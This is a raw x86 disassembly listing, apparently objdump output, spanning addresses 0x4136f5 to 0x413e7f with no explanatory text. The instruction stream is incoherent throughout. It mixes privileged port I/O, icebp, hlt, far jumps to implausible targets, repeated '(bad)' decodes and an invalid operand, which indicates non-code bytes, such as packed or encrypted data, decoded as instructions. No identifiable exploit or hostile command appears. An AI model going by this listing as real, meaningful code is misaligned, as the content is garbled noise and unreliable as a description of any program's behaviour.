  4136f5:	lods   eax,DWORD PTR ds:[esi]
  4136f6:	repz or bl,bl
  4136f9:	bound  eax,QWORD PTR [edx+0x4394387f]
  4136ff:	stos   BYTE PTR es:[edi],al
  413700:	shr    BYTE PTR [esi],1
  413702:	rol    BYTE PTR [ebx-0x7e],cl
  413705:	dec    ebx
  413706:	les    ebp,FWORD PTR [ebx-0x50]
  413709:	mov    ss:0x5e3745e5,eax
  41370f:	mov    al,0x93
  413711:	test   DWORD PTR [esi-0x657a0b8e],eax
  413717:	idiv   DWORD PTR [esi]
  413719:	mov    fs,WORD PTR ds:0x1a607010
  41371f:	xor    edi,ebp
  413721:	mov    bh,0x1a
  413723:	aaa    
  413724:	mov    ecx,0xee07bfb
  413729:	mov    eax,0x7f22c80f
  41372e:	jbe    0x413775
  413730:	fist   WORD PTR [edx+0x44fefb6]
  413736:	cmp    BYTE PTR [ebx+esi*2-0x20],ch
  41373a:	sti    
  41373b:	lods   eax,DWORD PTR ds:[esi]
  41373c:	mov    eax,ebx
  41373e:	data16 icebp 
  413740:	les    ebx,FWORD PTR [eax-0x6b]
  413743:	pop    eax
  413744:	mov    ch,BYTE PTR [eax+0x12]
  413747:	sti    
  413748:	stos   BYTE PTR es:[edi],al
  413749:	dec    ecx
  41374a:	or     BYTE PTR [esi+0x7e],ch
  41374d:	lods   eax,DWORD PTR ds:[esi]
  41374e:	out    dx,eax
  41374f:	push   ebx
  413750:	cmp    BYTE PTR [ebx+0x6f],dl
  413753:	xlat   BYTE PTR ds:[ebx]
  413754:	call   0x4303:0xeef29080
  41375b:	pop    ecx
  41375c:	jnp    0x4137d7
  41375e:	lea    esp,[edx]
  413760:	push   esp
  413761:	sbb    al,BYTE PTR [esi-0xd6bffac]
  413767:	mov    al,ds:0xa4ddf121
  41376c:	push   ebp
  41376d:	out    0x4c,eax
  41376f:	icebp  
  413770:	sub    al,0x3e
  413772:	add    cl,BYTE PTR [ebx+0x57e4699d]
  413778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413779:	sub    al,0x99
  41377b:	jo     0x413729
  41377d:	add    esi,DWORD PTR [ebp-0x28]
  413780:	mov    ds:0xe8139c40,al
  413785:	jb     0x413755
  413787:	mov    ecx,0x56fc19fc
  41378c:	outs   dx,BYTE PTR ds:[esi]
  41378d:	push   0x6
  41378f:	lock test eax,0x53e11649
  413795:	pop    ds
  413796:	sbb    eax,DWORD PTR [eax-0x21]
  413799:	xchg   esp,esi
  41379b:	fldcw  WORD PTR [ecx]
  41379d:	push   ecx
  41379e:	xor    BYTE PTR [ecx+0x3d],bl
  4137a1:	retf   0xaee7
  4137a4:	push   edi
  4137a5:	and    BYTE PTR [ebx],dl
  4137a7:	in     al,dx
  4137a8:	xchg   DWORD PTR ds:0x5cc1a573,ebx
  4137ae:	js     0x41375d
  4137b0:	js     0x41380c
  4137b2:	jb     0x4137d6
  4137b4:	adc    bl,BYTE PTR [eax+0x71]
  4137b7:	imul   BYTE PTR [eax+0x3d]
  4137ba:	daa    
  4137bb:	pop    eax
  4137bc:	outs   dx,DWORD PTR ds:[esi]
  4137bd:	(bad)  
  4137be:	push   0xffffffe8
  4137c0:	push   ds
  4137c1:	xor    DWORD PTR [esi-0x16],edx
  4137c4:	mov    ch,0xed
  4137c6:	lods   eax,DWORD PTR ds:[esi]
  4137c7:	daa    
  4137c8:	ror    DWORD PTR [esi+0x30],1
  4137cb:	out    0xff,al
  4137cd:	(bad)  
  4137ce:	adc    eax,0x5ee5ef53
  4137d3:	aas    
  4137d4:	shl    DWORD PTR ds:0x648f88f4,1
  4137da:	jne    0x413826
  4137dc:	inc    ebx
  4137dd:	xchg   ecx,eax
  4137de:	rcr    cl,cl
  4137e0:	adc    eax,0x396288ac
  4137e5:	mov    al,0x39
  4137e7:	and    esi,DWORD PTR [edx+0x54]
  4137ea:	xor    DWORD PTR [edi],edi
  4137ec:	or     bl,BYTE PTR [edx+eiz*4]
  4137ef:	outs   dx,DWORD PTR ds:[esi]
  4137f0:	fbld   TBYTE PTR [esi]
  4137f2:	sub    DWORD PTR [esi-0x3a],ebp
  4137f5:	in     al,0xba
  4137f7:	call   0xebebc0a
  4137fc:	pushf  
  4137fd:	stos   BYTE PTR es:[edi],al
  4137fe:	in     al,dx
  4137ff:	or     BYTE PTR [ebx],ah
  413801:	cmp    al,0xe7
  413803:	add    al,0x9a
  413805:	pop    es
  413806:	jb     0x41381d
  413808:	stc    
  413809:	xor    ah,dl
  41380b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41380c:	rcl    DWORD PTR [ebx-0x3c3e8b5e],0x0
  413813:	jbe    0x4137e6
  413815:	adc    al,0x39
  413817:	sahf   
  413818:	ret    
  413819:	add    al,0x51
  41381b:	inc    BYTE PTR [ebp-0x4]
  41381e:	shl    BYTE PTR [edi+0x241cc60e],cl
  413824:	mov    ch,BYTE PTR [ebp-0x3491d14b]
  41382a:	jnp    0x41383d
  41382c:	push   cs
  41382d:	mov    cl,0xb9
  41382f:	popa   
  413830:	cmc    
  413831:	loope  0x413820
  413833:	fcom   DWORD PTR [esi]
  413835:	int    0x91
  413837:	test   al,0xf5
  413839:	cli    
  41383a:	les    esp,FWORD PTR [esi-0x7fe12dd6]
  413840:	rcr    dh,1
  413842:	dec    ecx
  413843:	sub    al,0x5c
  413845:	mov    ds:0xf92b75ce,eax
  41384a:	test   eax,0x67ee8b08
  41384f:	test   DWORD PTR [edi],ebp
  413851:	and    eax,0x355fb6f3
  413856:	lock xlat BYTE PTR ds:[ebx]
  413858:	ins    BYTE PTR es:[edi],dx
  413859:	into   
  41385a:	retf   
  41385b:	lods   al,BYTE PTR ds:[esi]
  41385c:	sbb    bl,bh
  41385e:	xchg   BYTE PTR fs:[ecx-0x28fd2e3c],cl
  413865:	push   ebx
  413866:	dec    ebx
  413867:	in     eax,0xbe
  413869:	mov    ah,0xe8
  41386b:	into   
  41386c:	add    cl,BYTE PTR [ebx+edx*1]
  41386f:	fs and eax,0xcad59980
  413875:	or     DWORD PTR ds:0xb357ba36,ebx
  41387b:	push   0xfffffff6
  41387d:	sbb    DWORD PTR [edi-0x27],ebp
  413880:	int    0xf5
  413882:	repz rcr DWORD PTR [ebp-0x11],1
  413886:	imul   esp,edx,0xe
  413889:	cli    
  41388a:	cmc    
  41388b:	ins    DWORD PTR es:[edi],dx
  41388c:	in     eax,0xa1
  41388e:	loop   0x413856
  413890:	std    
  413891:	pop    edi
  413892:	pcmpeqd mm6,QWORD PTR [edi]
  413895:	and    DWORD PTR [edi],edi
  413897:	add    DWORD PTR [ebx-0x6eb853ab],0xffffffb0
  41389e:	or     DWORD PTR [ecx],esi
  4138a0:	mov    al,0xeb
  4138a2:	shl    DWORD PTR [esi-0x42],0x8b
  4138a6:	ret    
  4138a7:	loop   0x413873
  4138a9:	xchg   ebx,eax
  4138aa:	jb     0x41386c
  4138ac:	int3   
  4138ad:	into   
  4138ae:	test   BYTE PTR [edx],0x6a
  4138b1:	sahf   
  4138b2:	dec    ebx
  4138b3:	jmp    0x2d8d:0xa3b4b9d5
  4138ba:	jmp    0xf0f54cd
  4138bf:	loop   0x4138e5
  4138c1:	pop    edx
  4138c2:	test   BYTE PTR [ebx-0x514b303c],bh
  4138c8:	das    
  4138c9:	cld    
  4138ca:	and    BYTE PTR [edx+0x5d],ch
  4138cd:	jno    0x413891
  4138cf:	fxch   st(3)
  4138d1:	(bad)  
  4138d2:	ss sahf 
  4138d4:	fistp  QWORD PTR [ecx]
  4138d6:	lods   eax,DWORD PTR ds:[esi]
  4138d7:	out    0xa7,al
  4138d9:	xchg   ebx,eax
  4138da:	sbb    al,0x1d
  4138dc:	retf   0x406a
  4138df:	pop    esp
  4138e0:	jno    0x4138d4
  4138e2:	jmp    0x413922
  4138e4:	add    DWORD PTR [ecx-0x36],ecx
  4138e7:	les    edi,FWORD PTR [eax]
  4138e9:	or     DWORD PTR [eax+0x68],edi
  4138ec:	arpl   WORD PTR [esi],cx
  4138ee:	xchg   ebp,eax
  4138ef:	jnp    0x41394f
  4138f1:	inc    eax
  4138f2:	(bad)  
  4138f3:	cmp    al,0xd4
  4138f5:	mov    esi,0xfc8e5322
  4138fa:	jns    0x4138c8
  4138fc:	mov    dh,0xd0
  4138fe:	inc    edx
  4138ff:	xor    al,0x67
  413901:	push   0x2a025655
  413906:	xchg   edx,eax
  413907:	sbb    DWORD PTR [eax+0x3e121c4],ebx
  41390d:	shl    DWORD PTR [edx+0x7fe27d98],1
  413913:	mov    eax,0x5ef8d39
  413918:	xchg   edi,eax
  413919:	sbb    BYTE PTR [esi+edx*8+0x23],ah
  41391d:	aaa    
  41391e:	mov    edx,0x3671ab61
  413923:	and    eax,0xd3b9a972
  413928:	cmp    dl,bl
  41392a:	inc    esp
  41392b:	push   edi
  41392c:	adc    bh,BYTE PTR ds:0xfbb85229
  413932:	lds    edx,FWORD PTR [eax]
  413934:	addr16 mov cr2,ebp
  413938:	loopne 0x413979
  41393a:	pop    ebp
  41393b:	rcl    BYTE PTR [edi+0x50],cl
  41393e:	adc    BYTE PTR [ebx+0x494b3a3c],al
  413944:	xchg   ah,ah
  413946:	inc    ah
  413948:	aad    0x76
  41394a:	ficom  WORD PTR [edi-0x79]
  41394d:	jo     0x413925
  41394f:	dec    ebp
  413950:	bound  esp,QWORD PTR [ebp+0x1326bb9a]
  413956:	pop    edx
  413957:	popa   
  413958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413959:	gs hlt 
  41395b:	mov    ebp,0x9f056bb2
  413960:	cmp    BYTE PTR [ecx],bl
  413962:	inc    ecx
  413963:	orps   xmm6,XMMWORD PTR [edx-0x6379aea7]
  41396a:	loopne 0x4138fb
  41396c:	popf   
  41396d:	enter  0x170f,0xe3
  413971:	(bad)  
  413972:	hlt    
  413973:	pop    esi
  413974:	(bad)  
  413975:	jmp    0xf43ddc38
  41397a:	test   ah,0x9c
  41397d:	fild   QWORD PTR [edx-0x61]
  413980:	fdivr  QWORD PTR [edx+0x3a]
  413983:	or     al,0xf2
  413985:	outs   dx,BYTE PTR ds:[esi]
  413986:	cmp    DWORD PTR [ecx],esi
  413988:	mov    al,0xef
  41398a:	mov    dh,0x52
  41398c:	xchg   esi,eax
  41398d:	cmp    al,0x76
  41398f:	hlt    
  413990:	nop
  413991:	sbb    eax,0x170b5709
  413996:	shl    DWORD PTR [ebp-0x7c7c941f],cl
  41399c:	enter  0x4718,0x56
  4139a0:	or     edi,DWORD PTR [ebx-0x31]
  4139a3:	es jle 0x4139c7
  4139a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139a7:	lods   al,BYTE PTR ds:[esi]
  4139a8:	and    esp,DWORD PTR [ebp+0x5f56f695]
  4139ae:	idiv   esi
  4139b0:	shl    bl,cl
  4139b2:	dec    esp
  4139b3:	scas   al,BYTE PTR es:[edi]
  4139b4:	jne    0x4139b7
  4139b6:	shl    BYTE PTR [ecx-0x797c0c50],1
  4139bc:	(bad)  
  4139bd:	xor    bl,dh
  4139bf:	fs nop
  4139c1:	stos   BYTE PTR es:[edi],al
  4139c2:	sub    BYTE PTR [edx+0x78],bl
  4139c5:	or     eax,0x4dc15227
  4139ca:	pop    ebp
  4139cb:	scas   eax,DWORD PTR es:[edi]
  4139cc:	in     eax,0x1b
  4139ce:	scas   al,BYTE PTR es:[edi]
  4139cf:	repz cmp eax,0xc7ef4f86
  4139d5:	fcomp  QWORD PTR [ebx]
  4139d7:	push   es
  4139d8:	mov    dh,0x43
  4139da:	jge    0x413a1b
  4139dc:	dec    esi
  4139dd:	add    al,0x11
  4139df:	and    al,0xcb
  4139e1:	std    
  4139e2:	mov    cl,0x87
  4139e4:	cld    
  4139e5:	lock cmp esp,ebp
  4139e8:	sub    bl,BYTE PTR [edi-0x7b]
  4139eb:	sbb    DWORD PTR [edi],edx
  4139ed:	les    ebx,FWORD PTR [eax]
  4139ef:	pop    esi
  4139f0:	into   
  4139f1:	repz add ecx,DWORD PTR [ecx]
  4139f4:	mov    es:0x626f0dc4,eax
  4139fa:	in     al,0xe4
  4139fc:	jae    0x413a10
  4139fe:	jmp    0xb4cff749
  413a03:	sbb    eax,esi
  413a05:	sti    
  413a06:	ret    
  413a07:	push   esp
  413a08:	add    cl,dh
  413a0a:	push   cs
  413a0b:	sub    eax,0x2e96a642
  413a10:	les    esi,FWORD PTR [edi+0x38]
  413a13:	inc    eax
  413a14:	mov    bh,0xad
  413a16:	fstp   TBYTE PTR [ecx]
  413a18:	mov    ah,0x13
  413a1a:	cmp    DWORD PTR [ebp-0x4],esi
  413a1d:	in     al,dx
  413a1e:	call   0xd491e230
  413a23:	pop    ds
  413a24:	mov    BYTE PTR [ebx],bh
  413a26:	and    esp,DWORD PTR [ecx]
  413a28:	pop    ebp
  413a29:	cmp    DWORD PTR [ecx-0x6b3b9105],0x7d
  413a30:	jmp    0x5ad1:0x1e72b8b1
  413a37:	das    
  413a38:	shl    DWORD PTR [ebp+edi*8-0x6e62cec7],cl
  413a3f:	sub    eax,0xf1183da1
  413a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a45:	cmp    ah,al
  413a47:	out    dx,al
  413a48:	push   ds
  413a49:	push   ds
  413a4a:	push   es
  413a4b:	in     al,0x94
  413a4d:	retf   
  413a4e:	add    DWORD PTR [ebp+edi*4-0x7],esi
  413a52:	lfs    edx,FWORD PTR [edx-0x56]
  413a56:	andnps xmm1,XMMWORD PTR [esp+esi*4-0x6f]
  413a5b:	inc    esi
  413a5c:	cld    
  413a5d:	hlt    
  413a5e:	sbb    dh,bl
  413a60:	imul   edx,DWORD PTR [eax-0xbeb4ea],0xd5e3db5d
  413a6a:	int3   
  413a6b:	xlat   BYTE PTR ds:[ebx]
  413a6c:	pushf  
  413a6d:	int    0xa8
  413a6f:	(bad)  
  413a70:	push   edi
  413a71:	out    dx,al
  413a72:	pusha  
  413a73:	jmp    0x71e5cba3
  413a78:	stos   BYTE PTR es:[edi],al
  413a79:	shl    DWORD PTR [edi+0x5b],1
  413a7c:	dec    ebp
  413a7d:	lahf   
  413a7e:	pop    edx
  413a7f:	cmp    al,0xae
  413a81:	sub    dl,BYTE PTR [ecx+0x67a3591a]
  413a87:	jns    0x413a73
  413a89:	pop    edx
  413a8a:	xor    BYTE PTR [esi-0x1e],0x10
  413a8e:	das    
  413a8f:	jb     0x413a1c
  413a91:	popf   
  413a92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a93:	sub    edi,ebx
  413a95:	pop    edx
  413a96:	mov    ch,0xfc
  413a98:	adc    DWORD PTR [edi],esp
  413a9a:	mov    edx,0x60169b43
  413a9f:	dec    ebx
  413aa0:	sub    BYTE PTR [esi+edi*8-0x2f],cl
  413aa4:	dec    esp
  413aa5:	push   edx
  413aa6:	stc    
  413aa7:	mov    gs,ebx
  413aa9:	(bad)  
  413aaa:	stos   DWORD PTR es:[edi],eax
  413aab:	xchg   ebx,eax
  413aac:	clc    
  413aad:	test   BYTE PTR [eax],al
  413aaf:	mov    DWORD PTR [ebp+edi*8+0x4fd29ee0],edx
  413ab6:	inc    ecx
  413ab7:	and    al,0x15
  413ab9:	sbb    al,0xf6
  413abb:	sahf   
  413abc:	fsub   DWORD PTR [ebp+0x2703f698]
  413ac2:	push   es
  413ac3:	add    eax,0x68c873fb
  413ac8:	adc    DWORD PTR cs:[edx-0x25],ecx
  413acc:	cmp    bh,dh
  413ace:	sahf   
  413acf:	je     0x413a9b
  413ad1:	bound  edx,QWORD PTR [edx+0x39]
  413ad4:	xchg   ecx,eax
  413ad5:	push   es
  413ad6:	push   esp
  413ad7:	imul   esi,DWORD PTR [esp+ebx*1-0x5530716f],0xffffff82
  413adf:	lea    esp,[ecx+0x64972c6c]
  413ae5:	xor    DWORD PTR [eax],ebp
  413ae7:	jmp    0x413a7d
  413ae9:	adc    eax,DWORD PTR [ebx+0x56d027fa]
  413aef:	sbb    dl,dh
  413af1:	mov    BYTE PTR [ecx],dl
  413af3:	inc    ecx
  413af4:	xor    al,0x51
  413af6:	cmp    bh,BYTE PTR [edx]
  413af8:	jmp    0x62e9:0x3db1d253
  413aff:	mov    ebx,DWORD PTR [edx]
  413b01:	inc    ebp
  413b02:	add    cl,BYTE PTR [edx+0x12]
  413b05:	repz (bad) 
  413b07:	dec    eax
  413b08:	xor    BYTE PTR [edi+0x203ae205],bl
  413b0e:	adc    al,0x45
  413b10:	mov    eax,ds:0xcaf519f
  413b15:	jns    0x413b4e
  413b17:	fisubr DWORD PTR [edi-0x31]
  413b1a:	push   cs
  413b1b:	xor    eax,esp
  413b1d:	std    
  413b1e:	popf   
  413b1f:	sub    bl,BYTE PTR [edi-0x56]
  413b22:	adc    al,0xf2
  413b24:	cld    
  413b25:	retf   0xb847
  413b28:	mov    al,0xea
  413b2a:	cmp    eax,0x6611472c
  413b2f:	jecxz  0x413aeb
  413b31:	std    
  413b32:	sub    al,0xd8
  413b34:	push   esp
  413b35:	fldcw  WORD PTR [ebx]
  413b37:	inc    ebx
  413b38:	xor    edi,DWORD PTR [eax+0x2d6c4a33]
  413b3e:	mov    edi,edi
  413b40:	data16 mov al,ds:0x13572a1a
  413b46:	mov    cl,0xbe
  413b48:	adc    al,0x1b
  413b4a:	mov    ds:0xe3200f76,al
  413b4f:	dec    edi
  413b50:	rep ins BYTE PTR es:[edi],dx
  413b52:	xlat   BYTE PTR ds:[ebx]
  413b53:	clc    
  413b54:	mov    esi,0x6a4981a
  413b59:	in     al,0x77
  413b5b:	jbe    0x413afb
  413b5d:	out    0x30,eax
  413b5f:	mov    ebx,0x3d1811e
  413b64:	cwde   
  413b65:	popa   
  413b66:	add    edx,DWORD PTR [eax+0x161394ed]
  413b6c:	nop
  413b6d:	and    bl,ch
  413b6f:	mov    ch,0x78
  413b71:	cdq    
  413b72:	xchg   edx,eax
  413b73:	out    dx,al
  413b74:	ret    0x1ddf
  413b77:	pop    ebx
  413b78:	ss jnp 0x413bef
  413b7b:	inc    edi
  413b7c:	lds    esi,FWORD PTR [ebp-0x2]
  413b7f:	outs   dx,BYTE PTR ds:[esi]
  413b80:	scas   eax,DWORD PTR es:[edi]
  413b81:	push   cs
  413b82:	inc    ebx
  413b83:	mov    eax,DWORD PTR [edi+0x68fb2ad8]
  413b89:	mov    dl,0xd8
  413b8b:	fistp  DWORD PTR [ecx]
  413b8d:	nop
  413b8e:	das    
  413b8f:	in     al,0x26
  413b91:	stc    
  413b92:	aaa    
  413b93:	xchg   esp,eax
  413b94:	rcl    DWORD PTR [eax],0xea
  413b97:	adc    eax,0xb30e7cd6
  413b9c:	dec    ebp
  413b9d:	pop    ds
  413b9e:	xor    esp,DWORD PTR [edi]
  413ba0:	jge    0x413be1
  413ba2:	and    edi,DWORD PTR [ecx+0x29]
  413ba5:	mov    esi,ebx
  413ba7:	push   ebx
  413ba8:	test   al,0xe1
  413baa:	fs repnz mov edx,0x1a44ee55
  413bb1:	mov    cs,WORD PTR [ebp-0x11]
  413bb4:	mov    ds:0x36b931fc,al
  413bb9:	and    BYTE PTR [edx+0x13],dh
  413bbc:	sub    ecx,DWORD PTR [ebp-0x3e8ed16f]
  413bc2:	add    cl,BYTE PTR [edx]
  413bc4:	hlt    
  413bc5:	xchg   edi,eax
  413bc6:	sub    al,0x9e
  413bc8:	dec    eax
  413bc9:	addr16 jmp 0xbf5d:0xe8fccc42
  413bd1:	nop
  413bd2:	pushf  
  413bd3:	mov    ds:0xda6929f0,eax
  413bd8:	jmp    0x13549e13
  413bdd:	ror    ebx,1
  413bdf:	xchg   ecx,eax
  413be0:	pop    edi
  413be1:	data16 loopne 0x413bff
  413be4:	xor    cl,BYTE PTR ds:0x9ee6efd9
  413bea:	jl     0x413bb2
  413bec:	mov    edi,DWORD PTR [eax-0x29]
  413bef:	sub    dl,cl
  413bf1:	repnz adc dl,BYTE PTR [ebx-0x23]
  413bf5:	data16 sbb al,BYTE PTR [eax+0x10]
  413bf9:	adc    DWORD PTR [eax],ebx
  413bfb:	sbb    cl,BYTE PTR [edi+0x68]
  413bfe:	mov    al,cl
  413c00:	retf   
  413c01:	or     BYTE PTR [eax+edi*8+0x173adeb7],0x80
  413c09:	dec    edi
  413c0a:	(bad)
  413c0d:	push   es
  413c0e:	mov    ds:0x87da8b44,eax
  413c13:	mov    dh,0x4a
  413c15:	test   al,0x76
  413c17:	pop    edi
  413c18:	retf   0xbc80
  413c1b:	fs mov esp,0x8badf36
  413c21:	je     0x413c1e
  413c23:	mov    edx,0xac834d61
  413c28:	(bad)  
  413c29:	xchg   ebp,eax
  413c2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c2b:	dec    ebp
  413c2c:	inc    esp
  413c2d:	adc    al,0xf8
  413c2f:	pop    ss
  413c30:	pusha  
  413c31:	(bad)  
  413c32:	fisttp QWORD PTR [esi+0x4bb1b5ba]
  413c38:	outs   dx,BYTE PTR ds:[esi]
  413c39:	sub    edi,DWORD PTR ss:[ebx-0x2d]
  413c3d:	int3   
  413c3e:	pop    eax
  413c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c40:	sbb    DWORD PTR [ecx-0x2f],ebp
  413c43:	repz in al,0x2a
  413c46:	cwde   
  413c47:	fbld   TBYTE PTR [ecx]
  413c49:	out    0x70,eax
  413c4b:	or     BYTE PTR [edi-0x4f],ah
  413c4e:	pop    edx
  413c4f:	mov    dh,0xf2
  413c51:	cld    
  413c52:	mov    bh,0xc4
  413c54:	sub    eax,0xa08e8c18
  413c59:	sbb    al,0x19
  413c5b:	test   eax,0x74e96522
  413c60:	test   DWORD PTR [eax-0x34],ebp
  413c63:	xchg   esp,eax
  413c64:	(bad)  
  413c65:	inc    ebp
  413c66:	and    DWORD PTR [ecx+0x7c6abad2],esp
  413c6c:	mov    edx,0x2b26db15
  413c71:	cdq    
  413c72:	fbstp  TBYTE PTR ds:0x99521894
  413c78:	push   esp
  413c79:	aam    0x90
  413c7b:	jl     0x413cf5
  413c7d:	repnz push es
  413c7f:	mov    dl,0xa0
  413c81:	addr16 pop ebp
  413c83:	cld    
  413c84:	jbe    0x413ca7
  413c86:	mov    edx,0x1b185353
  413c8b:	fisub  WORD PTR [ebp+0x5b61acce]
  413c91:	data16 xor bl,dl
  413c94:	push   ebx
  413c95:	stos   DWORD PTR es:[edi],eax
  413c96:	loope  0x413d05
  413c98:	sub    al,0x35
  413c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c9b:	push   edx
  413c9c:	es arpl di,si
  413c9f:	mov    esi,0xd50152fa
  413ca4:	xchg   esi,eax
  413ca5:	enterw 0xfb25,0xbb
  413caa:	and    eax,0x9f21e12b
  413caf:	test   al,0xaa
  413cb1:	add    eax,0x2e192e4e
  413cb6:	sbb    al,0x53
  413cb8:	push   esi
  413cb9:	xor    dl,cl
  413cbb:	ror    ebx,1
  413cbd:	fs nop
  413cbf:	dec    esi
  413cc0:	and    cl,dh
  413cc2:	retf   0x4190
  413cc5:	repz sbb dh,BYTE PTR [edx+0x25f9c083]
  413ccc:	in     al,0x84
  413cce:	add    dl,ch
  413cd0:	xor    DWORD PTR [edx+0x98709f9],0x2d
  413cd7:	mov    bh,0x45
  413cd9:	std    
  413cda:	pop    es
  413cdb:	test   BYTE PTR [eax+eiz*2],bl
  413cde:	in     al,0x31
  413ce0:	test   eax,0x341abd4d
  413ce5:	xor    DWORD PTR [edi-0x16eddb09],edx
  413ceb:	es pop edx
  413ced:	xlat   BYTE PTR gs:[ebx]
  413cef:	fidiv  DWORD PTR [edx-0x3]
  413cf2:	inc    edi
  413cf3:	lods   eax,DWORD PTR ds:[esi]
  413cf4:	sub    dh,BYTE PTR [eax]
  413cf6:	and    eax,0x3534940e
  413cfb:	jae    0x413d09
  413cfd:	sbb    DWORD PTR [esi],0xceadbdb8
  413d03:	je     0x626b3f32
  413d09:	adc    cl,BYTE PTR [ecx+0x13]
  413d0c:	cmc    
  413d0d:	mov    ecx,0xe8989bf5
  413d12:	ja     0x413cc4
  413d14:	sbb    DWORD PTR [edi-0x5b],ebp
  413d17:	xchg   DWORD PTR [edi+edx*2+0x5e],ecx
  413d1b:	out    0xb9,al
  413d1d:	gs pop ebp
  413d1f:	cmp    eax,0x1cd47562
  413d24:	dec    edi
  413d25:	pop    ds
  413d26:	call   0x10fb:0xfd5ca272
  413d2d:	arpl   WORD PTR [eax],di
  413d2f:	outs   dx,DWORD PTR ds:[esi]
  413d30:	shl    BYTE PTR ss:[edi-0x3fea8a41],0x3b
  413d38:	js     0x413d50
  413d3a:	shl    BYTE PTR [esi],cl
  413d3c:	xchg   edx,eax
  413d3d:	imul   esi,DWORD PTR [ecx-0x213ce576],0xffffffa2
  413d44:	retf   0xc0c2
  413d47:	push   edx
  413d48:	stc    
  413d49:	pop    es
  413d4a:	or     DWORD PTR [ebx-0x38],esi
  413d4d:	lock cmc 
  413d4f:	mov    esi,0x1da7fa23
  413d55:	popf   
  413d56:	mov    ebx,0xb038c6bb
  413d5b:	inc    esi
  413d5c:	idiv   bl
  413d5e:	xchg   ebx,eax
  413d5f:	mov    ebp,0x3723d6e5
  413d64:	je     0x413d58
  413d66:	add    esp,esi
  413d68:	sub    edx,esp
  413d6a:	imul   DWORD PTR [edx-0x74]
  413d6d:	icebp  
  413d6e:	mov    dl,0xce
  413d70:	das    
  413d71:	sub    edi,DWORD PTR [esi-0x63992c77]
  413d77:	ss dec eax
  413d79:	dec    eax
  413d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d7b:	mov    ?,WORD PTR [eax]
  413d7d:	retf   
  413d7e:	sbb    al,bl
  413d80:	stos   DWORD PTR es:[edi],eax
  413d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d82:	imul   esi,DWORD PTR [ecx+0x51a8e7e5],0xb801570f
  413d8c:	sbb    dl,cl
  413d8e:	sub    eax,0x5edc7bca
  413d93:	lock xor bl,bl
  413d96:	adc    BYTE PTR [eax+ebx*1],cl
  413d99:	add    eax,DWORD PTR [ebp-0x55]
  413d9c:	test   DWORD PTR [edx+0x5c],ecx
  413d9f:	adc    DWORD PTR [eax+eiz*2],edi
  413da2:	mov    ch,0x23
  413da4:	and    esp,DWORD PTR [ebp-0x49]
  413da7:	push   0xffffffa7
  413da9:	lods   eax,DWORD PTR ds:[esi]
  413daa:	pushf  
  413dab:	not    cl
  413dad:	retf   0xaeb7
  413db0:	push   edx
  413db2:	mov    cl,0xc1
  413db4:	pop    ds
  413db5:	test   al,0xd2
  413db7:	or     al,bh
  413db9:	mov    ds:0xcfc31607,eax
  413dbe:	add    ebp,DWORD PTR [eax+0x3ce677e5]
  413dc4:	aaa    
  413dc5:	(bad)  [ecx-0xd]
  413dc8:	js     0x413d92
  413dca:	add    bl,ah
  413dcc:	xchg   ebp,eax
  413dcd:	and    ebp,DWORD PTR [edx]
  413dcf:	push   ds
  413dd0:	xor    cl,BYTE PTR [edx+edx*1-0x4f409450]
  413dd7:	data16 cmp ch,al
  413dda:	push   ss
  413ddb:	icebp  
  413ddc:	call   0x9be2:0x155ec2ef
  413de3:	mov    eax,ds:0xd82f409a
  413de8:	scas   eax,DWORD PTR es:[edi]
  413de9:	inc    esp
  413dea:	push   edi
  413deb:	lods   al,BYTE PTR ds:[esi]
  413dec:	and    dh,BYTE PTR [ebp-0x2d99543e]
  413df2:	pop    ds
  413df3:	ds ret 
  413df5:	sti    
  413df6:	push   ds
  413df7:	(bad)  
  413df8:	mov    dl,0x4e
  413dfa:	mov    WORD PTR [eax],gs
  413dfc:	js     0x413dbd
  413dfe:	dec    esp
  413dff:	sub    esp,edx
  413e01:	add    esi,DWORD PTR [edx-0x17dcc912]
  413e07:	push   ecx
  413e08:	sub    DWORD PTR [esi-0x4c1d8bc7],esi
  413e0e:	inc    ebx
  413e0f:	mov    esi,DWORD PTR [edx-0x23]
  413e12:	cmp    BYTE PTR [ebp-0x7fba81c3],ah
  413e18:	test   BYTE PTR ds:0xff96531e,dl
  413e1e:	div    DWORD PTR [esp+ebp*8+0x7b]
  413e22:	shl    DWORD PTR [ebp-0x33ef8c3b],0xd9
  413e29:	pop    ebx
  413e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e2b:	xchg   ebx,eax
  413e2c:	cdq    
  413e2d:	mov    ebx,0x4229b34
  413e32:	out    0xd9,al
  413e34:	les    esp,FWORD PTR [eax-0x78]
  413e37:	mov    DWORD PTR [edi+0x71],edx
  413e3a:	jns    0x413e5f
  413e3c:	cli    
  413e3d:	jb     0x413e7b
  413e3f:	fild   QWORD PTR [ebx+0x29]
  413e42:	sub    DWORD PTR [ebx-0x41],edx
  413e45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e46:	mov    esp,0x5cc24e22
  413e4b:	lock out dx,eax
  413e4d:	loope  0x413dcf
  413e4f:	adc    eax,0xa7e9a2f7
  413e54:	mov    ch,0x29
  413e56:	mov    bh,0x75
  413e58:	popa   
  413e59:	scas   al,BYTE PTR es:[edi]
  413e5a:	push   esp
  413e5b:	js     0x413e90
  413e5d:	mov    bh,0x12
  413e5f:	mov    bl,0x54
  413e61:	push   ds
  413e62:	cmp    edx,edi
  413e64:	cdq    
  413e65:	and    edx,eax
  413e67:	add    esi,DWORD PTR [ebx-0x6287e5ce]
  413e6d:	aaa    
  413e6e:	mul    DWORD PTR [edi-0x43d1cc9e]
  413e74:	mov    al,0x27
  413e76:	add    ah,bh
  413e78:	or     ch,BYTE PTR [eax]
  413e7a:	fild   WORD PTR [esi]
  413e7c:	jle    0x413ee9
  413e7e:	xlat   BYTE PTR ds:[ebx]
  413e7f:	getsec 
